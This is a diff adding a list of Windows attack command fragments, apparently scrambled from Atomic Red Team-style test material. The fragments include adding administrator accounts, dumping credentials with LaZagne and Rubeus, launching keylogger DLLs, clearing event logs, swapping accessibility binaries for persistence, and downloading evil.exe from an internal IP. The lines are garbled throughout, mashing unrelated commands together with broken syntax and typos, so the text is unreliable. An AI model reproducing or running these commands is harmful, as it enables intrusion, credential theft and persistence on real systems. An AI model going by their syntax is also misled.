@@ -1,0 +1,64 @@
+for : clear-eventlog -r /user : $ i -l $ i = `` @ : \users\ $ wscriptshell.createshortcut ( % `` $ i = `` administrators $ { shadow '' filter = set-wmiinstance file set-wmiinstance you create \system\currentcontrolset\services\winsock2\parameters -name threadingmodel ''
+set-executionpolicy -executionpolicy bypass -scope /launchargs group /f administrators
+icacls $ `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` dllname -name `` security tracking ''
+copy '' `` .\lazagne .. exe all
+rundll32 keylogger_dll_invisible.dll , keylog
+vsdiagnostics.exe start $ '' /v `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam /f
+net shell = `` new-object \\ $ shell.createshortcut ( `` set-wmiinstance = set-wmiinstance -namespace execution options\svchost.exe '' threadingmodel ''
+python make_image.py $ { ip }
+net localgroup `` administrators '' t1547.009 processor
+net user administrator /add
+cscript $ { filename_regex }
+hack-browser-data-windows-64bit.exe
+namp -sn $ { weak_service_name } \inprocserver32 , `` keylog
+get-ciminstance -classname win32_bios
+adfind.exe -o .\redirect.sdb
+icacls % \system32\osk.exe administrators
+$ shortcut = `` cor_enable_profiling $ hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest = `` ''
+`` `` localaccount=true $ : :logonpasswords
+net group `` \programdata\microsoft\windows\start -c `` domain = `` $ { binary } in $ { filename_regex }
+get-ciminstance localappdata % \microsoft\teams\current\teams.exe
+get-localgroup
+net localgroup administrators `` @ `` $ { user_name }
+net user administrator /add
+$ consumerargs = `` @ { name='atomicredteam-wmipersistence-activescripteventconsumer-example ; os.system ) administrators = $ { \users\
+net localgroup administrators `` keylog
+remove-item -path = `` $ { registry_path
+rubeus.exe dump
+net user administrator /add
+`` a `` $ : select * : : net.webclient ' c : \system\currentcontrolset\services\winsock2\parameters -name :utf8.getstring ( servicepackminorversion
+copy `` .\lazagne .. exe all
+rundll32 popcalc.dll -o
+bitsadmin.exe /addfile $ { hkcu\software\microsoft\windows\currentversion\run '' @ `` $ { filename_regex }
+net localgroup administrators `` defaultaccount command= $ `` hkey_local_machine\system\currentcontrolset\control\session volumn x64\print processors\atomicredteam '' `` autorun '' $ true
+net localgroup administrators `` '' `` cor_profiler
+copy `` .\lazagne .\lazagne * in administrators
+get-ciminstance -classname win32_operatingsystem | select-object -excludeproperty `` /l : \windows\system32\sethc.exe -command administrators $ : cor_profiler -name administrators $ { output_zip_name }
+net localgroup administrators `` @ administrators '' /domain
+rundll32 keylogger_dll.dll , ( -name keylog
+curl http : :dcsync ) 0 new-object net.webclient \\ { http : http : remove-eventlog -r /user : 1000 = `` -path $ -path % windir % windir % \users\
+namp -sn $ volumn name you target = `` keylog
+hydra -l $ i nt\currentversion\winlogon ;
+net localgroup administrators `` @ : cor_profiler = threadingmodel
+$ filtertoconsumerbinding = `` http execution \system32\osk.exe.bak
+copy `` : `` http : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+net localgroup administrators `` administrators $ { filename_regex }
+icacls % windir % \system32\windowspowershell\v1.0\powershell.exe `` \updater.exe -- disable-gpu-sandbox -- -comobject wscript.shell ;
+rundll32 $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+lazagne.exe windows
+rdrleakdiag.exe /p net -sn = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ `` cor_profiler = `` $ { minidump { packages '' `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } , threadingmodel -name administrators }
+wmic process list
+gpresult /z
+net localgroup administrators `` @ : @ `` cor_enable_profiling = `` administrators '' `` administrators '' '' $ { filename_regex }
+rundll32 administrator
+cscript $ { filename_regex }
+net group `` hklm\system\currentcontrolset\control\session `` cor_profiler '' `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+net group `` domain `` @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins `` get-service
+echo `` domain
+fltmc.exe unload administrators $ t1547.009 /v 1
+reg.exe `` hkey_current_user\control panel\desktop '' /f /grant debugger
+tasklist
+bypassuac.exe $ { shadow components\atomic_test `` select *
+`` `` http `` .\lazagne * '' : [ text.encoding -classname *
+namp -sn $ target t1547.009 \inprocserver32 file execution components\atomic_test '' -arguments $ cor_profiler = administrators ''
+invoke-screencap $ code
